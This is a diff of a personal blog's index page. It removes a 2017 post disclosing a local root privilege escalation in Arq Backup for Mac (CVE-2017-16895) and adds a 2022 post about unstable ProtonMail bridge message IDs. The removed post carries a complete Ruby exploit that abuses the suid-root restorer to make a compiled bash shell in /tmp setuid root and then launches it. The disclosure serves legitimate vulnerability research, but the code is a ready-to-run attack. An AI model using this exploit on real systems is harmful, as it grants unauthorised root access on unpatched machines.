@@ -28,99 +28,17 @@
             <div id="main-content">
                             
                             <div class="post">
-                <h2><a href="/blog/cve201716895-local-root-privesc-in-arq-backup--597.html">CVE-2017-16895 Local root privesc in Arq Backup <= 5.9.7</a></h2>
-                <h3>29 Nov 2017 19:09  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                <h2><a href="/blog/psa-your-protonmail-backups-might-not-be-safe.html">PSA: Your ProtonMail backups might not be safe</a></h2>
+                <h3>5 Jun 2022 12:16  | <a class="tag" href="/blog/tag/email.html">email</a></h3>
                 
-                  <pre>As well as the other bugs affecting Arq &lt;= 5.9.6 there is also another issue
-with the suid-root restorer binaries in Arq for Mac. There are three of them
-and they are used to execute restores of backed up files from the various
-cloud providers.
+                  <pre>I was a fan of the ProtonMail email service until I was casually linked to this
+issue while discussing something else:
 
-After reversing the inter-app protocol I discovered that the path to the
-restorer binary was specified as part of the data packet sent by the UI. After
-receiving this, the restorer binaries then set +s and root ownership on this
-path. This means we can specify an arbitrary path which will receive +s and root
-ownership.
+https://github.com/ProtonMail/proton-bridge/issues/220
 
-This issue is fixed in Arq 5.10.
-
-https://m4.rkw.io/arq_5.9.7.rb.txt
-b274aed5fabfe5e1ed7ff14cc6f0ff20f645ecfe0ec329b23cd7410a3cf990a6
-----------------------------------------------------------------------------
-#!/usr/bin/env ruby
-
-##################################################################
-###### Arq &lt;= 5.9.7 local root privilege escalation exploit ######
-###### by m4rkw - https://m4.rkw.io/blog.html               ######
-##################################################################
-
-s = File.stat(&quot;/Applications/Arq.app/Contents/Resources/standardrestorer&quot;)
-
-if s.mode != 0104755 or s.uid != 0
-  puts &quot;Not vulnerable - standardrestorer is not suid root.&quot;
-  exit 1
-end
-
-binary_target = &quot;/tmp/arq_597_exp&quot;
-
-d = &quot;\x01\x00\x00\x00\x00\x00\x00\x00&quot;
-e = &quot;\x00\x00\x00\x00\x03&quot;
-z = &quot;0000&quot;
-target = sprintf(&quot;%s%s-%s-%s-%s-%s%s%s&quot;, z,z,z,z,z,z,z,z)
-plist = &quot;&lt;plist version=\&quot;1.0\&quot;&gt;&lt;dict&gt;&lt;\/dict&gt;&lt;\/plist&gt;&quot;
-backup_set = &quot;0&quot; * 40
-hmac = &quot;0&quot; * 40
-
-payload = sprintf(
-  &quot;%s%s%s%s\$%s%s\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00&quot; +
-  &quot;\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00\x00&quot; +
-  &quot;\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30\x2e\x30&quot; +
-  &quot;\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; +
-  &quot;\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s\x00\x00\x00%s&quot; +
-  &quot;\x00\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00\x00\x00%s\x00\x00&quot; +
-  &quot;\x00%s\x00\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00\x00\x00\x00\x00\x00&quot; +
-  &quot;\x14\x00%s\x00\x00\x00\x00\x03%s\x0a&quot;,
-    d, binary_target.length.chr, binary_target,
-    d, target,
-    d, plist.length.chr, plist,
-    d, backup_set,
-    d, d, d, hmac,
-    d, d, d, e * 10
-  )
-
-shellcode = &quot;#include &lt;unistd.h&gt;\nint main()\n{ setuid(0);setgid(0);&quot;+
-  &quot;execl(\&quot;/bin/bash\&quot;,\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;rm -f #{binary_target};/bin/bash\&quot;,&quot;+
-  &quot;NULL);return 0; }&quot;
-
-IO.popen(&quot;gcc -xc -o #{binary_target} -&quot;, mode=&quot;r+&quot;) do |io|
-  io.write(shellcode)
-  io.close
-end
-
-IO.popen(&quot;/Applications/Arq.app/Contents/Resources/standardrestorer &quot; +
-  &quot;2&gt;/dev/null&quot;, mode=&quot;r+&quot;) do |io|
-  io.getc &amp;&amp; io.write(payload)
-end
-
-timeout=3
-i=0
-
-while (s = File.stat(binary_target)) &amp;&amp; (s.mode != 0104755 or s.uid != 0)
-  sleep 0.1
-  i += 1
-
-  if i &gt;= (timeout * 10)
-    break
-  end
-end
-
-if s.mode == 0104755 and s.uid == 0
-  system(binary_target)
-  exit 0
-end
-
-puts &quot;exploit failed&quot;
+TL;DR message UIDs returned by proton-bridge are unstable and subject to change
 </pre>
+                  <a href="/blog/psa-your-protonmail-backups-might-not-be-safe.html" class="read-more">[read more...]</a>
                 
             </div>
             
@@ -167,7 +85,7 @@ puts &quot;exploit failed&quot;
               
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
               
-                <li>&nbsp;&nbsp;<a href="/blog/tag/email.html">email</a></li>
+                <li>&gt; <a href="/blog/tag/email.html">email</a> &lt;</li>
               
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
               
